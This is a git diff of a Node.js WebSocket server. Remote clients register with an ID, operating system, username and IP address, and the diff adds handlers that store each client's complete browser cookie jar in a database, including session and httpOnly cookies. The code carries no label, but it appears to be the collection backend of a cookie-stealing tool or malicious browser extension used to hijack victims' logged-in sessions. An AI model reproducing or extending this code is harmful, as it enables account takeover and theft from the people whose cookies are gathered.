@@ -3,6 +3,112 @@ const WebSocket = require("ws");
 const db = require("./db"); // Adjust the path as necessary
 const { socketMaps } = require("./sharedData");
 
+module.exports = function initializeClientApi(appClients, server) {
+  appClients.use(express.json());
+  appClients.use(express.urlencoded({ extended: true }));
+
+  const wss = new WebSocket.Server({ server });
+  wss.on("connection", (ws) => {
+    console.log("Client connected");
+    ws.on("message", (message) => {
+      try {
+        const data = JSON.parse(message);
+        if (data[0] == "alive") {
+          handleAlive(ws, data[1]);
+          return;
+        }
+        const client_id = getClientId(ws);
+        switch (data[0]) {
+          case "setcookies":
+            handleSetCookies(client_id, data[1]);
+            break;
+          case "updatecookie":
+            handeUpdateCookie(client_id, data[1]);
+        }
+      } catch (err) {
+        console.error(err);
+      }
+    });
+  });
+};
+function handleSetCookies(client_id, cookies) {
+  const stmt = db.prepare(
+    `
+      DELETE FROM cookies WHERE client_id = ?
+    `
+  );
+  stmt.run(client_id);
+  const stmtInsert = db.prepare(
+    `
+      INSERT INTO cookies (client_id, domain, name, value, expiration, secure, session, host_only, http_only, path)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `
+  );
+  cookies.forEach((cookie) => {
+    stmtInsert.run(
+      client_id,
+      cookie.domain,
+      cookie.name,
+      cookie.value,
+      cookie.expirationDate,
+      cookie.secure ? 1 : 0,
+      cookie.session ? 1 : 0,
+      cookie.hostOnly ? 1 : 0,
+      cookie.httpOnly ? 1 : 0,
+      cookie.path
+    );
+  });
+}
+function handeUpdateCookie(client_id, cookie) {
+  // check if cookie already exists
+  const existingCookie = db
+    .prepare(
+      "SELECT name FROM cookies WHERE client_id = ? AND name = ? AND path = ? AND domain = ?"
+    )
+    .get(client_id, cookie.name, cookie.path, cookie.domain);
+  if (!existingCookie) {
+    //insert new cookie
+    const stmtInsert = db.prepare(
+      `
+        INSERT INTO cookies (client_id, domain, name, value, expiration, secure, session, host_only, http_only, path)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+      `
+    );
+    stmtInsert.run(
+      client_id,
+      cookie.domain,
+      cookie.name,
+      cookie.value,
+      cookie.expirationDate,
+      cookie.secure ? 1 : 0,
+      cookie.session ? 1 : 0,
+      cookie.hostOnly ? 1 : 0,
+      cookie.httpOnly ? 1 : 0,
+      cookie.path
+    );
+    return;
+  }
+  const stmt = db.prepare(
+    `
+      UPDATE cookies
+      SET domain = ?, name = ?, value = ?, expiration = ?, secure = ?, session = ?, host_only = ?, http_only = ?, path = ?
+      WHERE client_id = ? AND name = ?
+    `
+  );
+  stmt.run(
+    cookie.domain,
+    cookie.name,
+    cookie.value,
+    cookie.expirationDate,
+    cookie.secure ? 1 : 0,
+    cookie.session ? 1 : 0,
+    cookie.hostOnly ? 1 : 0,
+    cookie.httpOnly ? 1 : 0,
+    cookie.path,
+    client_id,
+    cookie.name
+  );
+}
 function handleAlive(ws, data) {
   const { client_id, os, username } = data;
   if (!client_id || !os || !username) {
@@ -29,27 +135,8 @@ function handleAlive(ws, data) {
     );
     stmt.run(client_id, os, username, ws._socket.remoteAddress);
   }
-  socketMaps.set(client_id, ws);
+  socketMaps[client_id] = ws;
 }
-
-module.exports = function initializeClientApi(appClients, server) {
-  appClients.use(express.json());
-  appClients.use(express.urlencoded({ extended: true }));
-
-  const wss = new WebSocket.Server({ server });
-  wss.on("connection", (ws) => {
-    console.log("Client connected");
-    ws.on("message", (message) => {
-      try {
-        const data = JSON.parse(message);
-        switch (data[0]) {
-          case "alive":
-            handleAlive(ws, data[1]);
-            break;
-        }
-      } catch (err) {
-        console.error(err);
-      }
-    });
-  });
-};
+function getClientId(socket) {
+  return Object.keys(socketMaps).find((key) => socketMaps[key] === socket);
+}
